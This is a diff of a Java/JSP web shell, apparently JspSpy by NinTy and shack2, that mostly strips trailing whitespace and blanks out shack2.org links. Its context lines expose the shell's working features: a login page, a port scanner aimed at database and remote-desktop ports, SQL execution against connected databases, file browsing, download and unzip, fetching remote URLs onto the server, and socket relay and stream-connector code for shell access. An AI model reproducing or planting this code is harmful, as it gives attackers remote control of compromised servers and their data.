@@ -30,7 +30,7 @@ private static final String PORT_MAP = "PMSA";
 private static final String DBO = "DBO";
 private static final String SHELL_ONLINE = "SHELL_ONLINE";
 private static String SHELL_NAME = "";
-private static String WEB_ROOT = ""; 
+private static String WEB_ROOT = "";
 private static String SHELL_DIR = "";
 public static Map ins = new HashMap();
 private static class StringParse{
@@ -103,11 +103,11 @@ return false;
 }
 private static class StreamConnector extends Thread {
 private InputStream is;
-private OutputStream os;  
+private OutputStream os;
 public StreamConnector( InputStream is, OutputStream os ){
 this.is = is;
 this.os = os;
-}			  
+}
 public void run(){
 BufferedReader in  = null;
 BufferedWriter out = null;
@@ -229,7 +229,7 @@ for (int i=0;i<rows.size();i++) {
 	html+=("<tr class=\"alt1\" onMouseOver=\"this.className='focus';\" onMouseOut=\"this.className='alt1';\">");
 for (int j=0;j<r.getColumns().size();j++) {
 	Column c=(Column)r.getColumns().get(j);
-	
+
 	html+=("<td nowrap>");
 String vv = Util.htmlEncode(Util.getStr(c.getValue()));
 if (vv.equals(""))
@@ -549,7 +549,7 @@ out.println("<script type=\"text/javascript\">"+
 "		}"+
 "		form.submit();"+
 "	}"+
-"</script>");	
+"</script>");
 
 } catch (Exception e) {
 e.printStackTrace();
@@ -714,7 +714,7 @@ if (Util.isEmpty(ip))
 ip = "127.0.0.1";
 if (Util.isEmpty(ports))
 ports = "21,25,80,110,1433,1723,3306,3389,4899,5631,43958,65500";
-if (Util.isEmpty(timeout)) 
+if (Util.isEmpty(timeout))
 timeout = "2";
 out.println("<table width=\"100%\" border=\"0\" cellpadding=\"15\" cellspacing=\"0\"><tr><td>"+
 "<h2 id=\"Bin_H2_Title\">PortScan &gt;&gt;</h2>"+
@@ -851,7 +851,7 @@ if (!oldDbo.equals(dbo)) {
 dbo = oldDbo;
 }
 }
-} 
+}
 DBOperator Ddbo = (DBOperator)dbo;
 JSession.setAttribute(DBO,Ddbo);
 Util.outMsg(out,"Connect To DataBase Success!");
@@ -893,7 +893,7 @@ out.println("<table width=\"100%\" border=\"0\" cellpadding=\"15\" cellspacing=\
 "</p>"+
 "</form><script>changeurldriver('"+selectDb+"')</script>");
 out.println("<form action=\""+SHELL_NAME+"\" method=\"POST\">"+
-"<p><input type=\"hidden\" name=\"selectDb\" value=\""+selectDb+"\"><input type=\"hidden\" name=\"o\" value=\"executesql\"><table width=\"200\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tr><td colspan=\"2\">Run SQL query/queries on database :</td></tr><tr><td><textarea name=\"sql\" class=\"area\" style=\"width:600px;height:50px;overflow:auto;\">"+Util.htmlEncode(Util.getStr(sql))+"</textarea></td><td style=\"padding:0 5px;\"><input class=\"bt\" style=\"height:50px;\" name=\"submit\" type=\"submit\" value=\"Query\" /></td></tr></table></p></form></table>");	
+"<p><input type=\"hidden\" name=\"selectDb\" value=\""+selectDb+"\"><input type=\"hidden\" name=\"o\" value=\"executesql\"><table width=\"200\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tr><td colspan=\"2\">Run SQL query/queries on database :</td></tr><tr><td><textarea name=\"sql\" class=\"area\" style=\"width:600px;height:50px;overflow:auto;\">"+Util.htmlEncode(Util.getStr(sql))+"</textarea></td><td style=\"padding:0 5px;\"><input class=\"bt\" style=\"height:50px;\" name=\"submit\" type=\"submit\" value=\"Query\" /></td></tr></table></p></form></table>");
 } catch (Exception e) {
 //e.printStackTrace();
 throw e;
@@ -964,7 +964,7 @@ out.println("<style type=\"text/css\">"+
 "        <input type=\"hidden\" name=\"o\" value=\"login\">"+
 "        <input type=\"submit\" value=\"Login\"><br/><br/>"+
 "	  "+
-"<span style=\"font:11px Verdana;\">jdk版本："+jdkver+" Copyright &copy; 2009 NinTy,update this for jdk1.4 by shack2 </span><a href=\"http://www.shack2.org\" target=\"_blank\">www.shack2.org</a></p>"+
+"<span style=\"font:11px Verdana;\">jdk版本："+jdkver+" Copyright &copy; 2009 NinTy,update this for jdk1.4 by shack2 </span><a href=\"\" target=\"_blank\"></a></p>"+
 "    </form>");
 } catch (Exception e) {
 e.printStackTrace();
@@ -1002,7 +1002,7 @@ return f1.getName().compareTo(f2.getName());
 } else {
 return -1;
 }
-} else { 
+} else {
 if (f2.isDirectory()) {
 return 1;
 } else {
@@ -1060,7 +1060,7 @@ File r = roots[i];
 out.println("<a href=\"javascript:new fso({path:'"+Util.convertPath(r.getPath())+"'}).subdir();\">Disk("+Util.convertPath(r.getPath())+")</a>");
 if (i != roots.length -1) {
 out.println("|");
-} 
+}
 }
 out.println("</td>"+
 "</tr></form>"+
@@ -1075,7 +1075,7 @@ if (file.getParent() != null) {
 out.println("<tr class=alt1>"+
 "<td align=\"center\"><font face=\"Wingdings 3\" size=4>=</font></td>"+
 "<td nowrap colspan=\"5\"><a href=\"javascript:new fso({path:'"+Util.convertPath(file.getAbsolutePath())+"'}).parent()\">Goto Parent</a></td>"+
-"</tr>");	
+"</tr>");
 }
 int dircount = 0;
 int filecount = 0;
@@ -1196,7 +1196,7 @@ public boolean doBefore() {return false;}
 public boolean doAfter() {return false;}
 public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
 try {
-response.getWriter().println("<div style=\"padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;\">Copyright (C) 2014 <a href=\"http://www.shack2.org\" target=\"_blank\">http://www.shack2.org/</a> All Rights Reserved."+
+response.getWriter().println("<div style=\"padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;\">Copyright (C) 2014 <a href=\"\" target=\"_blank\">/</a> All Rights Reserved."+
 "</div>");
 } catch (Exception e) {
 e.printStackTrace();
@@ -1340,7 +1340,7 @@ private static class EditPropertyInvoker extends DefaultInvoker {
 public boolean doBefore(){return false;}
 public boolean doAfter(){return false;}
 public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
-PrintWriter out = response.getWriter();	
+PrintWriter out = response.getWriter();
 out.print("功能无法使用！");
 }
 }
@@ -1425,10 +1425,10 @@ public boolean doAfter(){return false;}
 public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
 try {
 String path  = StringParse.parse(request.getParameter("path"));
-if (Util.isEmpty(path)) 
+if (Util.isEmpty(path))
 return;
 File f = new File(path);
-if (!f.exists()) 
+if (!f.exists())
 return;
 response.setHeader("Content-Disposition","attachment;filename="+URLEncoder.encode(f.getName(),PAGE_CHARSET));
 BufferedInputStream input = new BufferedInputStream(new FileInputStream(f));
@@ -1455,7 +1455,7 @@ PrintWriter out = response.getWriter();
 String savepath = StringParse.parse(request.getParameter("savepath"));
 String url = StringParse.parse(request.getParameter("url"));
 if (Util.isEmpty(url))
-url = "http://www.shack2.org/";
+url = "";
 if (Util.isEmpty(savepath)) {
 savepath = JSession.getAttribute(CURRENT_DIR).toString();
 }
@@ -1726,30 +1726,30 @@ if (Util.isEmpty(savepath) || Util.isEmpty(zipfile))
 return;
 File save = new File(savepath);
 save.mkdirs();
-ZipFile file = new ZipFile(new File(zipfile));   
-Enumeration e = file.entries();   
-while (e.hasMoreElements()) {   
-ZipEntry en = (ZipEntry) e.nextElement(); 
+ZipFile file = new ZipFile(new File(zipfile));
+Enumeration e = file.entries();
+while (e.hasMoreElements()) {
+ZipEntry en = (ZipEntry) e.nextElement();
 String entryPath = en.getName();
 int index = entryPath.lastIndexOf("/");
 if (index != -1)
 entryPath = entryPath.substring(0,index);
 File absEntryFile = new File(save,entryPath);
-if (!absEntryFile.exists() && (en.isDirectory() || en.getName().indexOf("/") != -1)) 
+if (!absEntryFile.exists() && (en.isDirectory() || en.getName().indexOf("/") != -1))
 absEntryFile.mkdirs();
 BufferedOutputStream output = null;
 BufferedInputStream input = null;
 try {
-output = new BufferedOutputStream(   
-new FileOutputStream(new File(save,en.getName())));   
-input = new BufferedInputStream(   
-file.getInputStream(en));   
-byte[] b = new byte[1024];   
-int len = input.read(b);   
-while (len != -1) {   
-output.write(b, 0, len);   
-len = input.read(b);   
-}   
+output = new BufferedOutputStream(
+new FileOutputStream(new File(save,en.getName())));
+input = new BufferedInputStream(
+file.getInputStream(en));
+byte[] b = new byte[1024];
+int len = input.read(b);
+while (len != -1) {
+output.write(b, 0, len);
+len = input.read(b);
+}
 } catch (Exception ex) {
 } finally {
 try {
@@ -1894,7 +1894,7 @@ localOut = new DataOutputStream(soc.getOutputStream());
 this.readFromLocal(localIn,remoteOut);
 this.readFromRemote(soc,remoteSoc,remoteIn,localOut);
 }catch(Exception ex)
-{								
+{
 break;
 }
 }
@@ -2098,7 +2098,7 @@ out.println("<form action=\""+SHELL_NAME+"\" method=\"post\" name=\"doForm\"></f
 if (JSession.getAttribute(MSG) != null) {
 Util.outMsg(out,JSession.getAttribute(MSG).toString());
 JSession.removeAttribute(MSG);
-} 
+}
 } catch (Exception e) {
 e.printStackTrace();
 throw e ;
@@ -2304,7 +2304,7 @@ return;
 }
 } else {
 response.sendRedirect(SHELL_NAME+"?o=index");
-}					
+}
 } catch (Exception e) {
 ByteArrayOutputStream bout = new ByteArrayOutputStream();
 e.printStackTrace(new PrintStream(bout));
